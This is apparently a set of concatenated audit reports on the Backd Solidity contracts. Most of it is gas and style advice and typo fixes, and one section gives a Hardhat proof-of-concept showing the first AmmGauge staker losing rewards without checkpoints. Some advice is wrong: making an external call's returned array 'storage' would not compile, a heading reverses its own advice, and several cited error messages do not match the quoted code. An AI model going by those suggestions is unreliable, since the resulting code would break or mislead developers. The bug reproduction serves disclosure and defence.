#1 Memory to storage  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L54  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L41  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L21  use storage instead of memory can reduce the gas. i suggest to change          address[] memory pools = addressProvider.allPools(); to          address[] storage pools = addressProvider.allPools(); apply to others  #2 Use memory instead calldata  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L124  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L59  In the external functions where the function argument is read-only, the function() has an inputed parameter that using memory, if this function didnt change the parameter, its cheaper to use calldata then memory. so we suggest to change it.      function burnToTarget(address[] memory tokens_, address targetLpToken_) to      function burnToTarget(address[] calldata tokens_, address targetLpToken_) apply to others.  #3 use != 0 instead of >0   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137  for unsigned integer, >0 is less efficient then !=0, so use !=0 instead of >0. do to all line code.  #4 Caching lpgauge  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L161-L162              ILpGauge(lpGauge).userCheckpoint(src);             ILpGauge(lpGauge).userCheckpoint(dst); to the memory for reduce the gas fee because it use multiple times.  #5 Pre increment  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59  using pre increment more cheaper than post increment. so, i sugget to change           epoch++; to          ++epoch;  #6 change string to bytes32  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L152  reduce size of error message can reduce the gas fee. i suggest to convert string to bytes32  #7 Caching the length  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  caching the array length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity.
Typos   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237 ```solidity      * @param key Key to feeze ``` Change `feeze` to `freeze`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173 ```solidity      * @dev This does not invlude the gov. tokens queued for withdrawal. ``` Change `invlude` to `include`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29 ```solidity     event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ``` Change `Emmited` to `Emitted`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35 ```solidity     receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` Change `Recieve` to `Receive`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L84 ```solidity         // Transfering LP tokens back to sender ``` Change `Transfering` to `Transferring`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ``` Change `TOOD` to `TODO`   Issue: `Require` error message typo  Explanation: Messages should provide clear information for users to understand reason for failure  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L29 ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `delay be at least 3 days` to `delay must be at least 3 days`   Issue: Sensitive terms in both the comments and the code should be updated  Explanation: Terms incorporating "white," "black," "master" or "slave" are potentially problematic. Substituting more neutral terminology is becoming [common practice](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/)   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L336 ```solidity      * @param strategyPool The pool of the strategy to register (avoids blacklisting other addresses). ``` Suggestion: Change `blacklisting` to `denylisting`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L64 ```solidity         require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); ``` Suggestion: Change 'whitelisted' to 'allowlisted' in each case   Similarly for the following instances of 'whitelist' and its variations:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L36  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L65  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L71-L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L302  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L51  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L452  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L79-L80   Issue: TODOs that have not been addressed Explanation: Open TODOs should be worked through and removed  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ```
Issue: `Require` message is too long Explanation: The `require` revert strings referenced below can be shortened to 32 characters or fewer (as shown) to save gas   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L296 ```solidity         require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); ``` Change the referenced error message from `a staker vault already exists for the token` to `token already has staker vault`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L59 ```solidity         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); ``` Change the referenced error message from `contract can only be initialized once` to `contract already initialized`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L60 ```solidity         require(_minter != address(0), Error.INVALID_MINTER); ``` Change the referenced error message from `the minter address of the LP token and the pool address do not match` to `minter and pool address mismatch`   The same error message occurs in the lines referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L73  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L74  Example: ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `invalid parameter value attempted` to `invalid parameter value attempt`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L153 ```solidity         require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             "Maximum non-inflation amount exceeded."         ); ``` Change error message to `Max non-inflation amt exceeded`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L110 ```solidity         require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); ``` Change the referenced error message from `deadline has not been reached yet` to `deadline not yet reached`   Issue: Should use `!= 0` instead of `> 0` in a `require` statement if variable is an unsigned integer (`uint`)   Explanation: `!= 0` should be used where possible since `> 0` costs more gas  The same `require` occurs in all three lines below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125  ```solidity         require(amount > 0, Error.INVALID_AMOUNT); ``` Change `amount > 0` to `amount != 0` in each case   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92 ```solidity         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ``` Change `totalLockedBoosted > 0` to `totalLockedBoosted != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 ```solidity         require(length > 0, "No entries"); ``` Change `length > 0` to `length != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 ```solidity         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` Change `totalClaimable > 0` to `totalClaimable != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84 ```solidity         require(unallocatedSupply > 0, "No reward tokens in contract"); ``` Change `unallocatedSupply > 0` to `unallocatedSupply != 0`   Issue: Variables should not be initialized to their default values  Explanation: For example, initialization of `booleans` to their default value of `false` is unnecessary and costs gas  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L412 ```solidity         bool keeperGaugeExists = false; ``` Change to `bool keeperGaugeExists;`   Issue: Array length should not be looked up in every iteration of a `for` loop  Explanation: Calculating the array length costs gas  Recommendation: Read the length of the array from memory before executing the loop   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 ```solidity         for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ``` Recommendation: ```solidity         uint256 totalRolesLength = roles.length;          for (uint256 i; i < totalRolesLength; i = i.uncheckedInc()) { ``` Similarly for the seven `for` loops referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L94  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  
 ### 1. array length in loops can be cached instead of calculating in every iteration  The loop bounds are calculated with `array.length` which are calculated in every loop iterations which can result in high gas. The array length can be cached instead of calculating in every loop iteration to save gas.  ```solidity // Before for (uint i = 0; i < amounts.length; i++) { }  // After uint len = amounts.length; for (uint i = 0; i < len; i++) { } ```  The instances where this pattern can be applied is found as follows  ```solidity > grep -rn './contracts/tokenomics' -e 'for.*[.]length' ./contracts/tokenomics/FeeBurner.sol:59:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ./contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ./contracts/tokenomics/InflationManager.sol:119:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ### 2. Use solidity custom errors to save gas  solidity 0.8.4 introduces custom errors which are cheaper than using revert strings in terms of gas Use the custom error patterns to reduce gas cost.  for eg.  ```solidity    // Before   require(condition, "Revert strings");    // After   error CustomError();   if (!condition) {     revert CustomError();   } ```  more details can be found [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  ### 3. `!=0` is cheaper than `>0`  - In require statement, using `!=0` is cheaper than using `>0` for uints  ```solidity > grep -rn "./contracts/tokenomics" -e "require(.* > 0" ./contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); ./contracts/tokenomics/KeeperGauge.sol:142:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ./contracts/tokenomics/AmmGauge.sol:111:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmGauge.sol:136:        require(amount > 0, Error.INVALID_AMOUNT); ```
### 1. Emitted event reports wrong value  In the function `stakeFor()` the event should report `staked` instead of `amount`  ```solidity     function stakeFor(address account, uint256 amount) public virtual override returns (bool) {         ........         uint256 staked = newBal - oldBal;         balances[account] += staked;         totalStaked += staked;         emit AmmStaked(account, ammToken, amount);         // recommendation         // emit AmmStaked(account, ammToken, staked);     } ```  - [AmmGauge.sol#L66](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L66) - Same for function `unstakeFor()` [AmmGauge.sol#L136](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L136)  ### 2. Use Two-Step Transfer Pattern for Access Controls  - It is  possible that the role accidentally transfers ownership to the wrong address, resulting in a loss of the role.  - For example : [setMinter()](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63)  Recommendation:  ```solidity address minter; address temporaryMinter;  function setMinter(address owner_) external onlyGovernance {   temporaryMinter = owner_; }  function claimOwnership() external {   require(msg.sender == temporaryMinter);   minter = temporaryMinter;   temporaryOwner = address(0); } ```
# QA Report  ## [L-01] Missing zero address check  If parameter is accidentally set to zero the contract will have to be redeployed  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L96 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/Authorization.sol#L10 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L33 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L50 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L26 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L40 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L72  ## [L-02] Ownership transfer should be done in two steps https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  Consider implementing a two step process where `minter` nominates an account and the nominated account needs to call an `acceptMinter` function for the transfer of ownership to fully succeed.  This ensures the nominated EOA account is a valid and active account.  Other instance:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L78  ## [N-01] Typo https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ```solidity Recieve ``` Change to "Receive"  ## [N-02] Remove TODO  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ```solidity //TOOD: See if this is still needed somewhere ``` Also please fix wrong (but comical) spelling in future `TODO` notes.
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L140   # Vulnerability details  ## Impact The first staker within the `AmmGauge` may not get the rewards if the pool is not checkpointed right after he stakes and before he wants to claim the rewards.  ## Proof of Concept A testing environment that reproduces how the protocol is going to be deployed and managed is used to evaluate this case under the following assumptions and simplifications.   1) The inflation rate is fixed for simplicity (`0.001`).  2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The minting of tokens impact both on the inflation calculation and their balance. But this test evaluates the states just before minting (claimable balances). Following how the pools are updated, they are checkpointed in the end of the `_executeInflationRateUpdate` call. Not while staking.  In order to illustrate this scenario we will show both the vulnerable and non vulnerable situations.  Vulnerable Situation: 1) Alice, Bob, Charlie and David are future users of the pool. They all notice the inception of this project and decide to stake. 2) They all stake the same amount. Their transactions are mined with 1min of difference starting from Alice and finishing with David. 3) There is no external pool checkpoint between Alice and Bob (besides the one that is triggered when Bob stakes). 4) Sometime happens and they all want to check their accumulated reward balance. Alice accumulated much less than the others.  Non Vulnerable Situation: - The same as before but calling externally `_poolCheckpoint()` between Alice stake call and Bobs' and before checking the accumulated rewards.  The code to show this has a `secureCheckpoints` toggle that can be set as true or false to trigger (or not) the intermediate poolCheckpoints.          it('First Staker Rewards Calculation', async function () {                           let secureCheckpoints = false;             let currentShare, currentStakedIntegral, balances;             await this.ammgauge.poolCheckpoint();             await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async (from) => {                  currentShare = await this.ammgauge.perUserShare(from.address);                 currentStakedIntegral = await this.ammgauge.perUserStakedIntegral(from.address);                 balances = await this.ammgauge.balances(from.address);             }              const stake = async (to, amount) => {                 await updateStates(to)                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 await updateStates(to);                 console.log(" ")             }              const unstake = async (to, amount) => {                 await updateStates(to)                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates(to);                 console.log(" ")             }              // Each user stakes tokens             let initialStaking = ethers.utils.parseEther("10")             console.log(" ")             console.log("USERS STAKE");             for (const user of users) {             await stake(user, initialStaking)             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};             await ethers.provider.send("evm_increaseTime", [60 * 60]); // 1hr between stakes             }             console.log(" ")              await ethers.provider.send("evm_increaseTime", [ 5 * 24 * 60 * 60]); // 5 days             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};              let claimableRewards = [];             let claimedRewards = [];             console.log(" ")             console.log("USERS CLAIMABLE REWARDS AFTER 5 days");             console.log(" ")             for (const user of users) {                 let stepClaimable = await this.ammgauge.claimableRewards(user.address);                 claimableRewards.push(ethers.utils.formatEther(stepClaimable))                  let rewardsClaim = await (await this.ammgauge.claimRewards(user.address)).wait()                 claimedRewards.push(ethers.utils.formatEther(rewardsClaim.logs[0]["data"]))             }              console.log("Claimable calculated")             console.log("   ALICE - BOB -  CHARLIE - DAVID")             console.log(claimableRewards)              console.log(" ")             console.log("Effectively Claimed")             console.log("   ALICE - BOB -  CHARLIE - DAVID")             console.log(claimableRewards)         })  The outputs for both cases are shown on the following chart. The initial staking amount is 10eth amount of the DummyERC20 token.  |         | Without Checkpoints | With Checkpoints | |:-------:|:-------------------:|:----------------:| |  Alice  |         6.6         |       115.5      | |   Bob   |        111.9        |       111.9      | | Charlie |        110.1        |       110.1      | |  David  |        108.9        |       108.9      |   ## Recommended Mitigation Steps - Check how is calculated the staking variables while the pool has no tokens staked and also how the updates and checkpoints are performed.  
## Summary  ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | 1 | `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times | 1 | | 2 | Non-exploitable reentrancy | 1 | | 3 | Users can DOS themselves by executing `prepareUnlock(0)` many times | 1 | | 4 | Unused/empty `receive()`/`fallback()` function | 3 | | 5 | `safeApprove()` is deprecated | 4 | | 6 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 8 | | 7 | `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` | 1 |  Total: 19 instances over 7 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | 1 | Unneded import | 1 | | 2 | Return values of `approve()` not checked | 1 | | 3 | Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability | 2 | | 4 | Missing event for critical parameter change | 3 | | 5 | Use a more recent version of solidity | 1 | | 6 | Use a more recent version of solidity | 16 | | 7 | Constant redefined elsewhere | 10 | | 8 | Inconsistent spacing in comments | 3 | | 9 | File is missing NatSpec | 5 | | 10 | NatSpec is incomplete | 17 | | 11 | Event is missing `indexed` fields | 10 | | 12 | Not using the named return variables anywhere in the function is confusing | 2 | | 9 | Typos | 6 |  Total: 80 instances over 13 issues   ## Low Risk Issues  ### 1. `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times There's no check that the old address isn't the same as the new address, and there's no check that the migration has already happened  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  52       function migrate(address oldPoolAddress_) public override { 53           ILiquidityPool oldPool_ = ILiquidityPool(oldPoolAddress_); 54           IERC20 lpToken_ = IERC20(oldPool_.getLpToken()); 55           uint256 lpTokenAmount_ = lpToken_.balanceOf(msg.sender); 56           require(lpTokenAmount_ != 0, "No LP Tokens"); 57           require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); 58:          lpToken_.safeTransferFrom(msg.sender, address(this), lpTokenAmount_); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L58  ### 2. Non-exploitable reentrancy There is no reentrancy guard in this function, and if used with a token that has transfer callbacks, such as an ERC777, the caller can reenter before `balances` is updated. I don't currently see a way to exploit this  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol   #1  130          uint256 oldBal = IERC20(ammToken).balanceOf(address(this)); 131          IERC20(ammToken).safeTransfer(dst, amount); 132          uint256 newBal = IERC20(ammToken).balanceOf(address(this)); 133          uint256 unstaked = oldBal - newBal; 134          balances[msg.sender] -= unstaked; 135:         totalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L130-L135  ### 3. Users can DOS themselves by executing `prepareUnlock(0)` many times There's no check on the amount, and every call add another entry to an array. When the user finally calls `executeUnlocks()` they'll run out of gas  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol   #1  118      function prepareUnlock(uint256 amount) external override { 119          require( 120              totalStashed[msg.sender] + amount <= balances[msg.sender], 121              "Amount exceeds locked balance" 122:         ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L118-L122  ### 4. Unused/empty `receive()`/`fallback()` function If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`)  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  31:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L31  ```solidity File: protocol/contracts/RewardHandler.sol   #2  30:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L30  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #3  35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ### 5. `safeApprove()` is deprecated [Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead  *There are 4 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  27:               IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L27  ```solidity File: protocol/contracts/RewardHandler.sol   #2  52:           IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L52  ```solidity File: protocol/contracts/RewardHandler.sol   #3  64:           IERC20(token).safeApprove(spender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L64  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #4  118:          IERC20(token_).safeApprove(spender_, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ### 6. Missing checks for `address(0x0)` when assigning values to `address` state variables  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  72:           token = _token; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L72  ```solidity File: protocol/contracts/BkdLocker.sol  49:           rewardToken = _rewardToken;  74:           rewardToken = newRewardToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L49  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  43:           treasury = treasury_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  39:           ammToken = _ammToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L39  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  65:           fundAdmin = fundAdmin_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L65  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  48:           pool = _pool; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L48  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  21:           minter = _minter; ``` 